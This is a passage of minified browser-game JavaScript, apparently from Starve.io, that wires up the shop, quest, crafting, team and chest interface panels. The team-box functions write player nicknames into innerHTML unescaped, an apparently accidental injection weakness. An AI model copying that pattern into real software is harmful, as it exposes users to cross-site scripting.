                            0 === Je.info_box.activated ? (Cookies.set("starve_info_box", "1"),
                                Je.options.info_box_agree.display = "inline-block") : (Cookies.set("starve_info_box", "0"),
                                    Je.options.info_box_agree.display = "none"),
                                Je.info_box.activated = (Je.info_box.activated + 1) % 2
                        },
                        trigger: function (e, t, i) {
                            return e && this.activated && (this.display = 1,
                                this.id = 0 === i ? t.id : Te[t.id].id2,
                                this.x = t.info.translate.x + 80,
                                this.y = t.info.translate.y,
                                this.craft = i),
                                e
                        }
                    },
                    1 === this.info_box.activated ? this.options.info_box_agree.display = "inline-block" : this.options.info_box_agree.display = "none",
                    document.getElementById("info_case_agree_opt").addEventListener("mouseup", this.info_box.checkbox, !1),
                    Cookies.get("starve_scale") && (Z = Number(Cookies.get("starve_scale")),
                        document.getElementById("input_ratio").value = Z,
                        Z *= me / De,
                        Q()),
                    this.change_ratio = function () {
                        Cookies.set("starve_scale", "" + document.getElementById("input_ratio").value),
                            Z = document.getElementById("input_ratio").value * (me / De),
                            Q()
                    }
                    ,
                    document.getElementById("input_ratio").addEventListener("input", this.change_ratio, !1),
                    this.safe_delete = {
                        open: !1,
                        activated: Cookies.get("starve_safe") && "0" === Cookies.get("starve_safe") ? 0 : 1,
                        id: document.getElementById("sure_delete"),
                        style: document.getElementById("sure_delete").style,
                        agree: document.getElementById("agree").style,
                        button: 0,
                        i: 0,
                        quit: function () {
                            Je.safe_delete.style.display = "none",
                                Je.safe_delete.open = !1
                        },
                        all: function () {
                            xe.build.wait || (xe.craft.preview < 0 && xe.craft.id < 0 && !xe.ghost.enabled && client.delete_inv(Je.safe_delete.button),
                                Je.safe_delete.quit())
                        },
                        recycle: function () {
                            xe.craft.workbench && !xe.build.wait && (xe.craft.preview < 0 && xe.craft.id < 0 && !xe.ghost.enabled && client.recycle_inv(Je.safe_delete.button),
                                Je.safe_delete.quit())
                        },
                        one: function () {
                            xe.build.wait || (xe.craft.preview < 0 && xe.craft.id < 0 && !xe.ghost.enabled && client.delete_one_inv(Je.safe_delete.button),
                                Je.safe_delete.quit())
                        },
                        checkbox: function () {
                            Je.safe_delete.activated ? (Cookies.set("starve_safe", "0"),
                                Je.safe_delete.agree.display = "inline-block",
                                Je.options.agree.display = "none") : (Cookies.set("starve_safe", "1"),
                                    Je.safe_delete.agree.display = "none",
                                    Je.options.agree.display = "inline-block"),
                                Je.safe_delete.activated = !Je.safe_delete.activated
                        },
                        del: function (e) {
                            this.button = e,
                                document.getElementById("item_to_del").src = void 0 === sprite[we[e].img][0]._src ? sprite[we[e].img][0].src : sprite[we[e].img][0]._src,
                                we[e].recycle && !xe.zombie && xe.craft.workbench ? document.getElementById("recycle_delete").style.display = "inline-block" : document.getElementById("recycle_delete").style.display = "none",
                                this.activated ? (this.style.display = "inline-block",
                                    this.open = !0) : this.all()
                        },
                        update: function () {
                            this.style.left = Math.floor(ye - 235) + "px",
                                this.style.top = Math.floor(He - 175) + "px"
                        }
                    },
                    this.safe_delete.agree.display = "none",
                    this.safe_delete.activated ? this.options.agree.display = "inline-block" : this.options.agree.display = "none",
                    document.getElementById("one_delete").addEventListener("mouseup", this.safe_delete.one, !1),
                    document.getElementById("yes_delete").addEventListener("mouseup", this.safe_delete.all, !1),
                    document.getElementById("recycle_delete").addEventListener("mouseup", this.safe_delete.recycle, !1),
                    document.getElementById("no_delete").addEventListener("mouseup", this.safe_delete.quit, !1),
                    document.getElementById("case_agree").addEventListener("mouseup", this.safe_delete.checkbox, !1),
                    this.shop = {
                        open: !1,
                        kit: -1,
                        button: be(60, 60, 0, sprite[ze.SHOP]),
                        id: document.getElementById("shop_starterkit"),
                        style: document.getElementById("shop_starterkit").style,
                        update: function () {
                            this.style.left = Math.floor(ye - 300) + "px",
                                this.style.top = Math.floor(He - 215) + "px"
                        },
                        quit: function () {
                            Je.shop.open = !1,
                                Je.shop.style.display = "none"
                        },
                        select: function () {
                            Je.shop.open = !Je.shop.open,
                                Je.shop.open ? Je.shop.style.display = "inline-block" : Je.shop.style.display = "none"
                        },
                        buy: function () {
                            0 <= Je.shop.kit && (client.choose_kit(Je.shop.kit),
                                Je.shop.quit())
                        },
                        init: function () {
                            var e = xe.shop.value;
                            document.getElementById("points_bank").innerHTML = Utils.simplify_number(e) + " points";
                            for (var t = 0; t < t2.length; t++)
                                t2[t].price > e ? document.getElementById("starter" + (t + 1)).style.opacity = "0.4" : document.getElementById("starter" + (t + 1)).style.opacity = "1";
                            for (t = 1; t < 13; t++)
                                document.getElementById("inv_shop" + t).src = "./img/empty-shop.png",
                                    document.getElementById("amount_shop" + t).innerHTML = "";
                            document.getElementById("buy_kit").style.opacity = "0.2"
                        },
                        get_starter: function () {
                            var e = 8 < this.id.length ? Number(this.id.charAt(7) + this.id.charAt(8)) : Number(this.id.charAt(7));
                            xe.shop.value >= (t = t2[e - 1]).price ? (Je.shop.kit = e,
                                document.getElementById("buy_kit").style.opacity = "1") : (Je.shop.kit = -1,
                                    document.getElementById("buy_kit").style.opacity = "0.2");
                            for (var t = t.items, i = 1, n = 1; i < t.length + 1; i++)
                                t[i - 1][1] !== Be.BAG && (document.getElementById("inv_shop" + n).style.display = "inline-block",
                                    document.getElementById("inv_shop" + n).src = void 0 === sprite[we[t[i - 1][1]].img][0]._src ? sprite[we[t[i - 1][1]].img][0].src : sprite[we[t[i - 1][1]].img][0]._src,
                                    document.getElementById("amount_shop" + n).innerHTML = "" + t[i - 1][0],
                                    n++);
                            for (; n < 13; n++)
                                document.getElementById("inv_shop" + n).src = "./img/empty-shop.png",
                                    document.getElementById("amount_shop" + n).innerHTML = ""
                        }
                    },
                    document.getElementById("quit3").addEventListener("mouseup", this.shop.quit, !1),
                    document.getElementById("buy_kit").addEventListener("mouseup", this.shop.buy, !1),
                    n = 1; n < 11; n++)
                    document.getElementById("starter" + n).addEventListener("mouseup", this.shop.get_starter, !1);
                for (this.quests = {
                    open: !1,
                    activated: Cookies.get("starve_quests") && "1" === Cookies.get("starve_quests") ? 1 : 0,
                    button: be(60, 60, 0, sprite[ze.QUEST_BUTTON]),
                    id: document.getElementById("chronoquest"),
                    style: document.getElementById("chronoquest").style,
                    update: function () {
                        this.style.left = Math.floor(ye - 420) + "px",
                            this.style.top = Math.floor(He - 270) + "px"
                    },
                    quit: function () {
                        Je.quests.style.display = "none",
                            Je.quests.open = !1
                    },
                    select: function () {
                        Je.quests.open = !Je.quests.open,
                            Je.quests.open ? Je.quests.style.display = "inline-block" : Je.quests.style.display = "none"
                    },
                    list: [],
                    reset: function () {
                        for (var e = 0; e < r2.length; e++)
                            this.list[e] = 1,
                                document.getElementById("timeremain_" + e).style.display = "inline-block",
                                document.getElementById("time_finished_" + e).style.display = "none",
                                document.getElementById("claim_reward_" + e).style.display = "none"
                    },
                    timer: 0,
                    born: 0,
                    update_chrono: function () {
                        if (Je.quests.open) {
                            var e = (new Date).getTime();
                            if (!(e - this.timer < 1e3)) {
                                this.timer = e;
                                for (var t, i = 0; i < r2.length; i++)
                                    Je.quests.list[i] && (t = r2[i].time - (e - Fe.clock.init + Je.quests.born),
                                        document.getElementById("timeremain_" + i).innerHTML = 96e4 < t ? Math.floor(t / 48e4) + " days" : 48e4 < t ? Math.floor(t / 48e4) + " day" : 6e4 < t ? Math.floor(t / 6e4) + " min" : Math.floor(t / 1e3) + " sec")
                            }
                        }
                    },
                    restore: function (e) {
                        for (var t = 0; t < e.length; t++)
                            1 != e[t] && Je.quests.modify_simple(t, e[t])
                    },
                    modify_simple: function (e, t) {
                        3 !== t || 11 !== e && 12 !== e || (xe.inv.update_bag_size(0, 1),
                            Je.update_inv_buttons()),
                            document.getElementById("timeremain_" + e).innerHTML = "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;",
                            1 < t ? (document.getElementById("time_finished_" + e).innerHTML = "SUCCEED",
                                document.getElementById("timeremain_" + e).style.display = "none") : 0 === t && (document.getElementById("time_finished_" + e).innerHTML = "FAILED",
                                    document.getElementById("timeremain_" + e).style.display = "none"),
                            document.getElementById("claim_reward_" + e).style.display = 2 === t ? "inline-block" : "none",
                            document.getElementById("time_finished_" + e).style.display = "inline",
                            Je.quests.list[e] = 0
                    },
                    modify: function (e, t) {
                        Je.quests.modify_simple(e, t),
                            Je.quests.activated && (Je.quests.open = !0,
                                Je.quests.style.display = "inline-block")
                    },
                    checkbox: function () {
                        Je.quests.activated ? (Cookies.set("starve_quests", "0"),
                            Je.options.quests_agree.display = "none") : (Cookies.set("starve_quests", "1"),
                                Je.options.quests_agree.display = "inline-block"),
                            Je.quests.activated = !Je.quests.activated
                    },
                    claim: function () {
                        var e = Number(this.id.charAt(13))
                            , t = Number(this.id.charAt(14));
                        "" !== this.id.charAt(14) && 0 <= t && t <= 9 && (e = 10 * e + t),
                            client.claim_quest_reward(e)
                    }
                },
                    this.quests.activated ? this.options.quests_agree.display = "inline-block" : this.options.quests_agree.display = "none",
                    document.getElementById("quit_chronoquest").addEventListener("mouseup", this.quests.quit, !1),
                    n = 0; n < r2.length; n++)
                    document.getElementById("claim_reward_" + n).addEventListener("mouseup", this.quests.claim, !1);
                for (this.craft_list = {
                    open: !1,
                    button: be(60, 60, 0, sprite[ze.RECIPE_BUTTON]),
                    list: {
                        id: document.getElementById("recipe_craft"),
                        style: document.getElementById("recipe_craft").style,
                        recipes: [],
                        category: 0,
                        update: function () {
                            this.style.left = Math.floor(ye - 335) + "px",
                                this.style.top = Math.floor(He - 215) + "px"
                        },
                        quit: function () {
                            document.getElementById("recipe_craft").style.display = "none",
                                Je.craft_list.open = !1
                        },
                        previous: function () {
                            document.getElementById("recipe_craft").style.display = "none",
                                document.getElementById("home_craft").style.display = "inline-block"
                        },
                        get_recipe: function (e) {
                            (t = this.recipes[e]).o ? document.getElementById("watercraft").style.display = "inline-block" : document.getElementById("watercraft").style.display = "none",
                                t.f ? document.getElementById("firecraft").style.display = "inline-block" : document.getElementById("firecraft").style.display = "none",
                                t.w ? document.getElementById("workcraft").style.display = "inline-block" : document.getElementById("workcraft").style.display = "none",
                                t.e ? document.getElementById("wellcraft").style.display = "inline-block" : document.getElementById("wellcraft").style.display = "none";
                            for (var t = t.r, i = (e = 0,
                                1); e < t.length; e++)
                                document.getElementById("inv" + i).style.display = "inline-block",
                                    document.getElementById("inv" + i).src = void 0 === sprite[we[t[e][0]].img][0]._src ? sprite[we[t[e][0]].img][0].src : sprite[we[t[e][0]].img][0]._src,
                                    document.getElementById("numb" + i).innerHTML = "" + t[e][1],
                                    i++;
                            for (; i < 6; i++)
                                document.getElementById("inv" + i).style.display = "none",
                                    document.getElementById("numb" + i).innerHTML = ""
                        },
                        select: function (e) {
                            this.category = e,
                                document.getElementById("home_craft").style.display = "none",
                                document.getElementById("workcraft").style.display = "none",
                                document.getElementById("firecraft").style.display = "none",
                                document.getElementById("watercraft").style.display = "none",
                                document.getElementById("wellcraft").style.display = "none",
                                document.getElementById("recipe_craft").style.display = "inline-block",
                                document.getElementById("inv1").style.display = "none",
                                document.getElementById("inv2").style.display = "none",
                                document.getElementById("inv3").style.display = "none",
                                document.getElementById("inv4").style.display = "none",
                                document.getElementById("inv5").style.display = "none",
                                document.getElementById("numb1").innerHTML = "",
                                document.getElementById("numb2").innerHTML = "",
                                document.getElementById("numb3").innerHTML = "",
                                document.getElementById("numb4").innerHTML = "",
                                document.getElementById("numb5").innerHTML = "";
                            for (var t = 0, i = 0; t < Te.length; t++) {
                                var n = Te[t];
                                e === n.t && (this.recipes[i] = n,
                                    i++,
                                    document.getElementById("img_" + i).style.display = "inline-block",
                                    document.getElementById("img_" + i).src = void 0 === sprite[we[n.id2].img][0]._src ? sprite[we[n.id2].img][0].src : sprite[we[n.id2].img][0]._src)
                            }
                            for (i++; i < 49; i++)
                                document.getElementById("img_" + i).style.display = "none"
                        }
                    },
                    home: {
                        id: document.getElementById("home_craft"),
                        style: document.getElementById("home_craft").style,
                        update: function () {
                            this.style.left = Math.floor(ye - 285) + "px",
                                this.style.top = Math.floor(He - 170) + "px"
                        },
                        quit: function () {
                            document.getElementById("home_craft").style.display = "none",
                                Je.craft_list.open = !1
                        }
                    },
                    select_book: function () {
                        this.open = !this.open,
                            this.open ? document.getElementById("home_craft").style.display = "inline-block" : (document.getElementById("home_craft").style.display = "none",
                                document.getElementById("recipe_craft").style.display = "none")
                    }
                },
                    document.getElementById("quit").addEventListener("mouseup", this.craft_list.home.quit, !1),
                    document.getElementById("quitmenu").addEventListener("mouseup", this.craft_list.list.quit, !1),
                    document.getElementById("backhome").addEventListener("mouseup", this.craft_list.list.previous, !1),
                    document.getElementById("hatcategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(se)
                    }, !1),
                    document.getElementById("weaponcategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(ae)
                    }, !1),
                    document.getElementById("toolcategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(oe)
                    }, !1),
                    document.getElementById("foodcategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(_e)
                    }, !1),
                    document.getElementById("placeablecategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(Ee)
                    }, !1),
                    document.getElementById("constructioncategory").addEventListener("mouseup", function () {
                        Je.craft_list.list.select(ue)
                    }, !1),
                    document.getElementById("img_1").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(0)
                    }, !1),
                    document.getElementById("img_2").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(1)
                    }, !1),
                    document.getElementById("img_3").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(2)
                    }, !1),
                    document.getElementById("img_4").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(3)
                    }, !1),
                    document.getElementById("img_5").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(4)
                    }, !1),
                    document.getElementById("img_6").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(5)
                    }, !1),
                    document.getElementById("img_7").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(6)
                    }, !1),
                    document.getElementById("img_8").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(7)
                    }, !1),
                    document.getElementById("img_9").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(8)
                    }, !1),
                    document.getElementById("img_10").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(9)
                    }, !1),
                    document.getElementById("img_11").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(10)
                    }, !1),
                    document.getElementById("img_12").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(11)
                    }, !1),
                    document.getElementById("img_13").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(12)
                    }, !1),
                    document.getElementById("img_14").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(13)
                    }, !1),
                    document.getElementById("img_15").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(14)
                    }, !1),
                    document.getElementById("img_16").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(15)
                    }, !1),
                    document.getElementById("img_17").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(16)
                    }, !1),
                    document.getElementById("img_18").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(17)
                    }, !1),
                    document.getElementById("img_19").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(18)
                    }, !1),
                    document.getElementById("img_20").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(19)
                    }, !1),
                    document.getElementById("img_21").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(20)
                    }, !1),
                    document.getElementById("img_22").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(21)
                    }, !1),
                    document.getElementById("img_23").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(22)
                    }, !1),
                    document.getElementById("img_24").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(23)
                    }, !1),
                    document.getElementById("img_25").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(24)
                    }, !1),
                    document.getElementById("img_26").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(25)
                    }, !1),
                    document.getElementById("img_27").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(26)
                    }, !1),
                    document.getElementById("img_28").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(27)
                    }, !1),
                    document.getElementById("img_29").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(28)
                    }, !1),
                    document.getElementById("img_30").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(29)
                    }, !1),
                    document.getElementById("img_31").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(30)
                    }, !1),
                    document.getElementById("img_32").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(31)
                    }, !1),
                    document.getElementById("img_33").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(32)
                    }, !1),
                    document.getElementById("img_34").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(33)
                    }, !1),
                    document.getElementById("img_35").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(34)
                    }, !1),
                    document.getElementById("img_36").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(35)
                    }, !1),
                    document.getElementById("img_37").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(36)
                    }, !1),
                    document.getElementById("img_38").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(37)
                    }, !1),
                    document.getElementById("img_39").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(38)
                    }, !1),
                    document.getElementById("img_40").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(39)
                    }, !1),
                    document.getElementById("img_41").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(40)
                    }, !1),
                    document.getElementById("img_42").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(41)
                    }, !1),
                    document.getElementById("img_43").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(42)
                    }, !1),
                    document.getElementById("img_44").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(43)
                    }, !1),
                    document.getElementById("img_45").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(44)
                    }, !1),
                    document.getElementById("img_46").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(45)
                    }, !1),
                    document.getElementById("img_47").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(46)
                    }, !1),
                    document.getElementById("img_48").addEventListener("mousedown", function () {
                        Je.craft_list.list.get_recipe(47)
                    }, !1),
                    this.minimap = {
                        translate: {
                            x: 0,
                            y: 0
                        },
                        marker: {
                            x: -1,
                            y: -1
                        },
                        players: [],
                        focus: function (e) {
                            var t = this.translate.y + (0 < xe.inv.can_select.length ? -120 : -50);
                            e.x > this.translate.x && e.x < this.translate.x + 193 && e.y > t && e.y < t + 193 && (this.marker.x = e.x - this.translate.x,
                                this.marker.y = e.y - t)
                        }
                    },
                    this.leaderboard = {
                        translate: {
                            x: 0,
                            y: 0
                        },
                        img: sprite[ze.LEADERBOARD],
                        can: document.createElement("canvas")
                    },
                    this.leaderboard.can.width = this.leaderboard.img.width,
                    this.leaderboard.can.height = this.leaderboard.img.height,
                    this.leaderboard.ctx = this.leaderboard.can.getContext("2d"),
                    this.gauges = {
                        translate: {
                            x: 0,
                            y: 0
                        },
                        img: sprite[ze.GAUGES],
                        draw: X0,
                        y: 0
                    },
                    this.leave_team = function () {
                        (div = document.getElementById("team_box")).innerHTML = "",
                            div.innerHTML += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + Fe.players[xe.team[0]].nickname + "</div";
                        for (var e = 1; e < xe.team.length; e++)
                            div.innerHTML += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + Fe.players[xe.team[e]].nickname + "</div></div>";
                        div.innerHTML += '<div id="leave" style="display:inline-block;">LEAVE</div></div>',
                            div.style.display = "inline-block",
                            document.getElementById("leave").addEventListener("click", client.leave_team, !1)
                    }
                    ,
                    this.show_team = function () {
                        (div = document.getElementById("team_box")).innerHTML = "",
                            div.innerHTML += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + Fe.players[xe.team[0]].nickname + "</div";
                        for (var e = 1; e < xe.team.length; e++)
                            div.innerHTML += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + Fe.players[xe.team[e]].nickname + "</div></div>";
                        div.innerHTML += "</div>",
                            div.style.display = "inline-block"
                    }
                    ,
                    this.manage_team = function () {
                        (div = document.getElementById("team_box")).innerHTML = "",
                            div.innerHTML += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + Fe.players[xe.team[0]].nickname + "</div";
                        for (var e = 1; e < xe.team.length; e++)
                            div.innerHTML += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + Fe.players[xe.team[e]].nickname + '</div><div class="eject_member" id="eject_member' + e + '"><img src="./img/close-team.png" style="width:20px;padding:5px;"></img></div>';
                        for (0 === xe.totem.lock ? div.innerHTML += '<div id="lock_team" style="display:inline-block;">LOCK</div></div>' : div.innerHTML += '<div id="lock_team" style="display:inline-block;">UNLOCK</div></div>',
                            document.getElementById("lock_team").addEventListener("click", client.lock_team, !1),
                            div.style.display = "inline-block",
                            e = 1; e < xe.team.length; e++)
                            switch (e) {
                                case 1:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(1)
                                    }, !1);
                                    break;
                                case 2:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(2)
                                    }, !1);
                                    break;
                                case 3:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(3)
                                    }, !1);
                                    break;
                                case 4:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(4)
                                    }, !1);
                                    break;
                                case 5:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(5)
                                    }, !1);
                                    break;
                                case 6:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(6)
                                    }, !1);
                                    break;
                                case 7:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(7)
                                    }, !1);
                                    break;
                                case 8:
                                    document.getElementById("eject_member" + e).addEventListener("click", function () {
                                        client.kick_team(8)
                                    }, !1)
                            }
                    }
                    ,
                    this.team_buttons = [],
                    this.team_buttons[i2.TEAM_LEAVE] = {
                        button: be(60, 60, 0, sprite[ze.TEAM_BUTTON]),
                        action: this.leave_team
                    },
                    this.team_buttons[i2.TEAM_JOIN] = {
                        button: be(60, 60, 0, sprite[ze.TEAM_BUTTON]),
                        action: client.join_team
                    },
                    this.team_buttons[i2.TEAM_MANAGE] = {
                        button: be(60, 60, 0, sprite[ze.MANAGE_TEAM_BUTTON]),
                        action: this.manage_team
                    },
                    this.team_buttons[i2.TEAM_SHOW] = {
                        button: be(60, 60, 0, sprite[ze.SHOW_TEAM_BUTTON]),
                        action: this.show_team
                    },
                    this.team_buttons[i2.TEAM_FULL] = {
                        button: be(60, 60, 0, sprite[ze.FULL_TEAM_BUTTON]),
                        action: function () { }
                    },
                    this.team_buttons_id = -1,
                    this.bread_oven_wood_button = be(60, 60, 0, sprite[ze.BREAD_OVEN_WOOD]),
                    this.bread_oven_bread_button = be(60, 60, 0, sprite[ze.BREAD_OVEN_BREAD]),
                    this.bread_oven_flour_button = be(60, 60, 0, sprite[ze.WINDMILL_FLOUR]),
                    this.windmill_wheat_button = be(60, 60, 0, sprite[ze.WINDMILL_WHEAT_SEED]),
                    this.windmill_flour_button = be(60, 60, 0, sprite[ze.WINDMILL_FLOUR]),
                    this.extractor_wood_button = be(60, 60, 0, sprite[ze.INV_WOOD]),
                    this.extractor_stone_button = be(60, 60, 0, sprite[ze.INV_STONE]),
                    this.extractor_gold_button = be(60, 60, 0, sprite[ze.INV_GOLD]),
                    this.extractor_diamond_button = be(60, 60, 0, sprite[ze.INV_DIAMOND]),
                    this.extractor_amethyst_button = be(60, 60, 0, sprite[ze.INV_AMETHYST]),
                    this.extractor_reidite_button = be(60, 60, 0, sprite[ze.INV_REIDITE]),
                    this.furnace_button = be(60, 60, 0, sprite[ze.FURNACE_BUTTON]),
                    this.chest_padlock = be(60, 60, 0, sprite[ze.PADLOCK]),
                    this.chest_lockpick = be(60, 60, 0, sprite[ze.KEY]),
                    this.chest_locked = be(60, 60, 0, sprite[ze.LOCKED]),
                    this.resurrection = be(120, 120, 0, sprite[ze.DRAGON_HEART]),
                    this.resurrection.info.translate.x = 10,
                    this.resurrection.info.translate.y = 10,
                    this.chest_buttons = [],
                    this.chest_buttons[Be.SWORD] = be(68, 68, 0, sprite[ze.CHEST_SWORD], 3),
                    this.chest_buttons[Be.SWORD].id = Be.SWORD,
                    this.chest_buttons[Be.PICK] = be(68, 68, 0, sprite[ze.CHEST_PICK], 3),
                    this.chest_buttons[Be.PICK].id = Be.PICK,
                    this.chest_buttons[Be.STONE] = be(68, 68, 0, sprite[ze.CHEST_STONE], 3),
                    this.chest_buttons[Be.STONE].id = Be.STONE,
                    this.chest_buttons[Be.WOOD] = be(68, 68, 0, sprite[ze.CHEST_WOOD], 3),
                    this.chest_buttons[Be.WOOD].id = Be.WOOD,
                    this.chest_buttons[Be.PLANT] = be(68, 68, 0, sprite[ze.CHEST_PLANT], 3),
                    this.chest_buttons[Be.PLANT].id = Be.PLANT,
                    this.chest_buttons[Be.CACTUS] = be(68, 68, 0, sprite[ze.CHEST_CACTUS], 3),
                    this.chest_buttons[Be.CACTUS].id = Be.CACTUS,
                    this.chest_buttons[Be.GOLD] = be(68, 68, 0, sprite[ze.CHEST_GOLD], 3),
                    this.chest_buttons[Be.GOLD].id = Be.GOLD,
                    this.chest_buttons[Be.DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND], 3),
                    this.chest_buttons[Be.DIAMOND].id = Be.DIAMOND,
                    this.chest_buttons[Be.PICK_GOLD] = be(68, 68, 0, sprite[ze.CHEST_PICK_GOLD], 3),
                    this.chest_buttons[Be.PICK_GOLD].id = Be.PICK_GOLD,
                    this.chest_buttons[Be.PICK_DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_PICK_DIAMOND], 3),
                    this.chest_buttons[Be.PICK_DIAMOND].id = Be.PICK_DIAMOND,
                    this.chest_buttons[Be.SWORD_GOLD] = be(68, 68, 0, sprite[ze.CHEST_SWORD_GOLD], 3),
                    this.chest_buttons[Be.SWORD_GOLD].id = Be.SWORD_GOLD,
                    this.chest_buttons[Be.SWORD_WOOD] = be(68, 68, 0, sprite[ze.CHEST_SWORD_WOOD], 3),
                    this.chest_buttons[Be.SWORD_WOOD].id = Be.SWORD_WOOD,
                    this.chest_buttons[Be.SWORD_DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_SWORD_DIAMOND], 3),
                    this.chest_buttons[Be.SWORD_DIAMOND].id = Be.SWORD_DIAMOND,
                    this.chest_buttons[Be.FIRE] = be(68, 68, 0, sprite[ze.CHEST_FIRE], 3),
                    this.chest_buttons[Be.FIRE].id = Be.FIRE,
                    this.chest_buttons[Be.WORKBENCH] = be(68, 68, 0, sprite[ze.CHEST_WORKBENCH], 3),
                    this.chest_buttons[Be.WORKBENCH].id = Be.WORKBENCH,
                    this.chest_buttons[Be.SEED] = be(68, 68, 0, sprite[ze.CHEST_SEED], 3),
                    this.chest_buttons[Be.SEED].id = Be.SEED,
                    this.chest_buttons[Be.WALL] = be(68, 68, 0, sprite[ze.CHEST_WALL], 3),
                    this.chest_buttons[Be.WALL].id = Be.WALL,
                    this.chest_buttons[Be.SPIKE] = be(68, 68, 0, sprite[ze.CHEST_SPIKE], 3),
                    this.chest_buttons[Be.SPIKE].id = Be.SPIKE,
                    this.chest_buttons[Be.PICK_WOOD] = be(68, 68, 0, sprite[ze.CHEST_PICK_WOOD], 3),
                    this.chest_buttons[Be.PICK_WOOD].id = Be.PICK_WOOD,
                    this.chest_buttons[Be.COOKED_MEAT] = be(68, 68, 0, sprite[ze.CHEST_COOKED_MEAT], 3),
                    this.chest_buttons[Be.COOKED_MEAT].id = Be.COOKED_MEAT,
                    this.chest_buttons[Be.MEAT] = be(68, 68, 0, sprite[ze.CHEST_MEAT], 3),
                    this.chest_buttons[Be.MEAT].id = Be.MEAT,
                    this.chest_buttons[Be.BIG_FIRE] = be(68, 68, 0, sprite[ze.CHEST_BIG_FIRE], 3),
                    this.chest_buttons[Be.BIG_FIRE].id = Be.BIG_FIRE,
                    this.chest_buttons[Be.BANDAGE] = be(68, 68, 0, sprite[ze.CHEST_BANDAGE], 3),
                    this.chest_buttons[Be.BANDAGE].id = Be.BANDAGE,
                    this.chest_buttons[Be.CORD] = be(68, 68, 0, sprite[ze.CHEST_CORD], 3),
                    this.chest_buttons[Be.CORD].id = Be.CORD,
                    this.chest_buttons[Be.STONE_WALL] = be(68, 68, 0, sprite[ze.CHEST_STONE_WALL], 3),
                    this.chest_buttons[Be.STONE_WALL].id = Be.STONE_WALL,
                    this.chest_buttons[Be.GOLD_WALL] = be(68, 68, 0, sprite[ze.CHEST_GOLD_WALL], 3),
                    this.chest_buttons[Be.GOLD_WALL].id = Be.GOLD_WALL,
                    this.chest_buttons[Be.DIAMOND_WALL] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_WALL], 3),
                    this.chest_buttons[Be.DIAMOND_WALL].id = Be.DIAMOND_WALL,
                    this.chest_buttons[Be.WOOD_DOOR] = be(68, 68, 0, sprite[ze.CHEST_DOOR_WOOD_CLOSE], 3),
